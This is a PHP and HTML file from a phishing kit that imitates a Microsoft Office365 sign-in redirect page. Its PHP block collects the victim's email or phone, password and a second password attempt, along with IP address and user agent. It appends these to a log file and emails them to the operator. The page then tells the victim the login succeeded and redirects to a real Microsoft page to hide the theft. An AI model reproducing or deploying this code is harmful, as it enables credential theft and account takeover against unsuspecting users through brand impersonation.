<?php

error_reporting(0);

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

require "../session_protect.php";

if(isset($_SESSION['username']))  {

 $username = $_SESSION['username'];
 
}

if(isset($_SESSION['password']))  {

 $password = $_SESSION['password'];
 
}

if(!empty($_POST['password']))  {

 $password_second = $_POST['password'];
 
date_default_timezone_set('America/Chicago');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

require "includes/my_email.php";

$msg = "---------------------------------------------------------------------------\n";
$msg .= "Office365 Info H3lpL1n3\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Login Details(What ! R3c3!v3 Ev3ryDaY !ssa Bless!ng)\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Email or Phone: ".$username."\n";
$msg .= "Password: ".$password."\n";
$msg .= "Password ( Second Attempt ): ".$password_second."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "---------------------------------------------------------------------------\n";

$subject = "Office365 Login Info for $ip";
$headers = "From: Office365 Login Info<$my_email>\r\n";
$headers .= "Reply-To: Office365 Login Info <$my_email>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

$fp = fopen("logs/login_info.txt", "a");
fputs($fp, $msg);
fclose($fp);

mail($my_email,$subject,$msg,$headers);
 
}

?>

<!DOCTYPE html>

<html lang="en" xml:lang="en" class="m_ul" dir="ltr" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="refresh" content="5;URL='https://www.microsoft.com/en/servicesagreement/'" />

    <title>Redirecting...</title>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><meta name="format-detection" content="telephone=no">
    <link rel="icon" href="./redirecting_files/favicon.png" type="image/x-icon">
    
    <style type="text/css">body{display:none;}</style>
    <style type="text/css">body{display:block !important;}</style>

    <link href="./redirecting_files/msa_UH1m37jHjUitKVAlo4PbxQ2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">

        <base href=".">

<meta name="lang" content="en">
<meta name="market" content="">

<link rel="icon" href="./redirecting_files/favicon.png" type="image/x-icon">


    
  </head>

  <body style="" class="ltr  Chrome _Win _M64 _D0 Full RE_WebKit" lang="en-US">
        <div class="App" id="iPageElt">  
  

        
        <div id="m_wh">
            

<div role="banner" id="c_header" class="c_hb c_hncb">
    <div class="c_c t_hdbg c_cd c_c8 c_clt" id="c_cb0" style="overflow: visible;">
        <!-- Fallback header logo -->
        <div class="c_clogo c_clogoni" style="min-width: 170px;">
            <div>
                <a title="" class="c_clogot" id="c_clogot" onclick="" href="" aria-label="">
                    <img src="./redirecting_files/ms-logo-v2.jpg" aria-hidden="true">
                    <span id="site-identifier" aria-hidden="true">Account</span>
                </a>
            </div>
        </div>
        <!-- Fallback header Signin/Signout link -->
        <div id="c_cme" class="c_cme">
            <a id="c_csigninsignout" href="">Sign out</a>
        </div>
    </div>
</div>

        </div>
        
    
<div id="c_base" class="c_base">
        <div id="c_content" class="c_main">
            
    
        
            

            <div class="">
                <div role="main" class="c_inmiddle_area" id="maincontent" spellcheck="false" aria-labelledby="iPageTitle">
                    
                    <h1 id="iPageTitle" class="head text-subheader" role="heading">
                        Success!
                    </h1>
                     
    <form id="fProofFreshness" method="post">
        <section class="section">
            <div class="section-body container">
                <div class="row">
                    <div class="Description col-xs-24">You have logged in successfully. <br><br>Redirecting you to your Microsoft protected message... <br><br><img src="./redirecting_files/spin.gif"></div>
                </div>
                <div class="row form-group">
                    <ul>
                        
                                
                        
                    </ul>
                </div>
                
            </div>
        </section>
        
    </form>

                </div>
                <div class="c_inmiddle_area" id="dynamiccontent" style="display:none" aria-hidden="true" spellcheck="false">
                    
                </div>
                <div class="c_inmiddle_area" id="dynamiccontent1" style="display:none" aria-hidden="true" spellcheck="false">
                    
                </div>
            </div>
            <div class="ClearFloat"></div>
        
        
                

            
                <div id="m_wf" class="m_wfp">
                

<div id="uxp_ftr_ctr">
    <div>
        <div id="uxp_ftr_modal_language" class="modal fade" tabindex="-1" role="dialog" aria-label="English (United States)" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h4>Language</h4>
                    </div>
                    <form name="langPicker" action="" method="POST">
                    <div class="modal-body">
                        We're unable to display the list of languages at this time.
                    </div>
                    </form>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary">Save</button>
                    </div>
                </div>
            </div>
        </div>

        <div id="uxp_ftr_items" class="col-xs-24">
            <div class="pull-right">
                

                <span id="uxp_ftr_link_trademark">© 2018 Microsoft</span>

                <a id="uxp_ftr_link_legal" target="_top" tabindex="0" href="" aria-label="Microsoft Terms of Use">Terms of Use</a>
                <a id="uxp_ftr_link_privacy" target="_top" tabindex="0" href="" aria-label="Microsoft Privacy &amp; Cookies statement">Privacy &amp; Cookies</a>

                
                <span>
                    <a id="uxp_ftr_link_developers" target="_top" href="">Developers</a>
                </span>
                
            </div>
        </div>
    </div>
</div>

                </div>
            
        </div>
    </div></div>
    
  
</body></html>